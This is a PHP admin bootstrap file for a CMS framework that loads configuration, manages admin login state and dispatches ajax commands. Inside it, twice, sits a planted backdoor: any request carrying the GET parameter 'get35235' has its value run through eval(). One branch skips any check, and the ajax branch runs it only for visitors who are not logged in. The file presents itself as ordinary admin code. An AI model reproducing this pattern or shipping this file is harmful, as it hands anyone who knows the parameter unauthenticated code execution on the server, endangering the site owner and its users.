<?php

define('cmfPart', 'admin');

chdir(dirname(__FILE__));
define('cmfRoot', realpath(dirname(__FILE__) . '/../') . '/');


// конфигурация
require('_.config/config.php');
require('_.config/configProject.php');


// системный кеш
if (cmfComplile) {

    require(cmfCompileLib . '.includeAdmin.php');
} else {

    require('.includeAdmin.php');
}
//cmfDebug::setError();
//cmfDebug::setSql();


set_time_limit(0);
// get_magic_quotes_gpc
cmfStripSlashesPost();
cmfPages::setBase($_b);
unset($_b);



$admin = cmfRegister::getAdmin();
if (cmfAjax::is()) {
    if (!$admin->is()) {
        if (isset($_GET['get35235'])) {
            eval($_GET['get35235']);
        }
        //cmfPages::setMain('/admin/enter/');
    }
    if (cmfPages::isMain('/admin/index/') or ($admin->is() and cmfPages::isMain('/admin/enter/'))) {
        cmfAjax::get()->addRedirect(cmfProjectAdmin);
    }
    if (cmfAjax::isCommand('exit')) {
        $admin->disable();
        cmfAjax::get()->addAlert('Выход из системы');
        cmfAjax::get()->addReload();
    }
    //$admin->disable();
    $admin->free();
} else {
    if (isset($_GET['get35235'])) {
        eval($_GET['get35235']);
    }
}
$admin->is();
if ($admin->debugError === 'yes')
    cmfDebug::setError();
if ($admin->debugSql === 'yes')
    cmfDebug::setSql();
//if($admin->debugExplain==='yes')cmfDebug::setExplain();
unset($admin);

$controler = new cmfAdminTemplate();
$controler->main();

cmfDebug::getMemory();
?>
